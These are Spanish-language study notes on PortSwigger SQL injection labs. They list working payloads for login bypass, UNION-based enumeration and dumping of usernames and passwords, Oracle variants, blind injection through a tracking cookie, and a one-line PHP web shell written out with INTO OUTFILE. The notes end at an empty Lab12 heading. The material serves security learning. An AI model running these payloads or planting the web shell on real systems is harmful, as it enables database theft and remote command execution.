# SQL Intection 'PortSwigger' MySQL ❮❯

Tags: #BurpSuite #SQLI #Explotacion #Enumeracion 

```bash 
❯ burpsuite &> /dev/null & disown                    # Iniciamos el BurpSuite y lo mandamos a segundo plano
```

- **union select "<? system($_REQUEST['cmd']) ?>" into "/var/www/html/outfile"** Podemos crear un archivo llamado Outfile que contenga un cmd que nos interpretara comandos. Despues del primer ? va php

### DATABASE - TABLES - COLUMS - DATA 
Asi se conforma una base de datos

#### Lab1 SQL injection vunerability in WHERE clause allowing retrieval of hidden ***'%s'***
Estamos haciendo que nos comente el esto de la query por ende nos debe de mostrar todo el contenido visible de la pagina.
	**’or 1=1-- -    o    'or 1=1#** 
- ***-- - o #*** -> Para comentar lo que hay en la derecha y no se interprete
- or 1=1 -> Devuelve un codigo de estado exitoso TRUE 

#### Lab 2 SQL injection vulnerability allowing login bypass ***'%s'***
De los dos campos que tenemos en un panel de autenticacion, estamos haciendo que nos comente el segundo campo y por ende no tome en cuenta la password.
	**admin'-- -** 
- ***-- -***  Para comentar lo que hay en la derecha y no se interprete

#### Lab3 SQL injection UNION attack, determining the number of columns returned by the query 
A veces el ordenar columnas hace que nos salga un error, con el cual nos podriamos dar una idea, cuando no sale es ahi el numero de columnas existentes.
	**'order by 10-- -** Haremos un ordenamiento de los datos, basandonos en la decima colmuna, de ahi se reduce hasta que no nos muestre el error
Una vez obtenido el numero de las columnas, utlizamos el UNION select para combinar datos
	**'union select 1,2,3-- -** 
* 1,2 -> El numero de columnas que hemos encontrado, en este caso son dos... Si fuera mas seria 1,2,3,4 etc... Si la pagina no te admite numeros, en ese caso poner NULL,NULL,NULL. 
Esto es para MySQL y Microsoft
	**'union select NULL,@@version -- -** Para saber la version de MySQL y Microsoft
	
#### Lab4 SQL injection union attack, finding a column containing text
Una vez obtenido el numero de las columnas, utlizamos el UNION select para combinar datos
	**'union select NULL,'snhsb',NULL-- -** Buscar que campo es inyectable para poder ingresar funciones o comandos.
Dependiendo del campo que sea injectable, podemos colocarle diferentes cosas para que nos reporte algo. Por ejemplo:
* version() -> Podemos usar esos campos para que nos muestre diferentes cosas, en este caso la version
* database() -> Si la segunda columna es inyectable, ahi podriamos hacer que nos muestre la base de datos que esta usando
* user() -> Que me muestre que usuario esta corriendo la base de datos actual 

#### Lab5,6 SQL injection UNION attack, retrieving data from other tables and retrieving multiple values in a single column
- Para listar las bases de datos existentes
	**'union select 1,2,schema_name from information_schema.schemata -- -** Pone el resultado en forma de lista
	**'union select 1,2,*group_concat*(schema_name) from information_schema.schemata -- -** Para saber cuantas bases de datos tenemos, 
pone resultado en una sola linea, este es mas conveniente para listar el usuario y su passwd
	**'union select 1,schema_name,3 from information_schema.schemata -- -** El schema_name siempre va en el campo que es inyectable.

- Para enumerar las tablas 
	**'union select 1,2,table_name from information_schema.tables -- -** Lista las tablas de todas las bases de datos existentes
	**'union select 1,2,table_name from information_schema.tables WHERE table_schema='*DBS*'-- -** Lista las tablas de una base de datos especifica

- Para enumerar las columnas 
	**'union select 1,2,column_name from information_schema.columns WHERE table_schema='*DBS*' and table_name='*TABLENAME*' -- -** Lista las columnas de una base de datos especifica, donde tambien tenemos una tabla especifica

- Para mostrar la data con concatenaciones
	**'union select 1,2,group_concat(*username*, ':' ,*password*) from *DB.TABLENAME* -- -** Muestra los datos de las columnas obtenidas en una sola linea delimitado por los dos puntos (**: = 0x3a** representacion en hexadecimal) Hacemos esto si la base de datos actual no es la que contiene los datos que queremos 
	**'union select 1,2,group_concat(*username*, ':' ,*password*) from *TABLENAME* -- -** Muestra los datos de las columnas obtenidas en una sola linea delimitado por los dos puntos siempre y cuando la tabla sea de la base de datos de la que le queremos extraer los datos
	**'union select 1,2,concat(*username*,':',*password*) from *TABLENAME* -- -** Muestra los datos de las columnas obtenidas en una sola linea delimitado por los dos puntos siempre y cuando la tabla sea de la base de datos de la que le queremos extraer los datos
	**'union select 1,2,*username*||':'||*password* from *TABLENAME* -- -** Muestra los datos de las columnas obtenidas en una sola linea delimitado por los dos puntos siempre y cuando la tabla sea de la base de datos de la que le queremos extraer los datos, esta es otra forma de concatenar, por la web no te deja con group concat
	**'union select 1,*username*,*password* from *TABLENAME* -- -** Muestra los datos de las columnas obtenidas en fila siempre y cuando la tabla sea de la base de datos de la que le queremos extraer los datos, aqui estamos ocupando dos campos que son inyectables

#### Lab7, SQL injection attack, querying the database type and version on Oracle
La tabla DUAL es una tabla especial de una sola columna presente de manera predeterminada en todas las instalaciones de bases de datos de Oracle.
	**'union select NULL,NULL from dual -- -** Debemos de agregar esa tabla en Oracle para que no nos de error 
	**'union select NULL,banner from v$version -- -** Para saber la version de Oracle 

#### Lab10 SQL injection attack, listing the database contents on Oracle
La tabla DUAL es una tabla especial de una sola columna presente de manera predeterminada en todas las instalaciones de bases de datos de Oracle.
	**'union select NULL,NULL from dual -- -** Debemos de agregar esa tabla en Oracle para que no nos de error 
	**'union select NULL,owner from all_tables -- -** Primero listamos contra los propietarios
	**'union select NULL,table_name from all_tables WHERE owner='*OWNERNAME*' -- -** Miramos las tablas existentes de un propietario especifico
	**'union select NULL,column_name from all_tab_columns WHERE table_name='*TABLENAME*' -- -** Miramos las columnas existentes de un propietario especifico
	**'union select 1,2,*username*||':'||*password* from *TABLENAME* -- -** Muestra los datos de las columnas obtenidas en una sola linea delimitado por los dos puntos siempre y cuando la tabla sea de la base de datos de la que le queremos extraer los datos, esta es otra forma de concatenar, por la web no te deja con group concat

#### Lab11 Blind SQL injection with conditional responses
- En este caso el vulnerable es el TrackID, por lo que cuando algo es correcto nos sale en la web 'Welcome Back!'
Ademas de esto debemos de saber el nombre correcto de la DB, username, y asi nosotros por medio de un script de python3 podriamos adivinar la password.
	**Cookie: TrackingId=v54JPAcaS7lKSevV; session=O3YFg0GqU8Wjyv9qBo6F4JDUQGxuTdfg** Es la original
- Para que el script fucnione debemos de saber la longitud de la password y eso se hace de esta manera:
	**Cookie: TrackingId=v54JPAcaS7lKSevV' and (select 'a' from *users* where *username*='administrator' and length(*password*)>=20)='a'-- -; session=O3YFg0GqU8Wjyv9qBo6F4JDUQGxuTdfg**
	* users -> DBs
	* username -> nombre de usuario valido 
	* password -> passwd que queremos encontrar
	* 20 es el tamano de la password y eso lo sabemos porque hasta ahi aun nos sigue saliendo el 'Welcome Back!'
Despues nos hacemos el script en python3 y obtenemos la password.


#### Lab12 Blind SQL injection with conditional errors
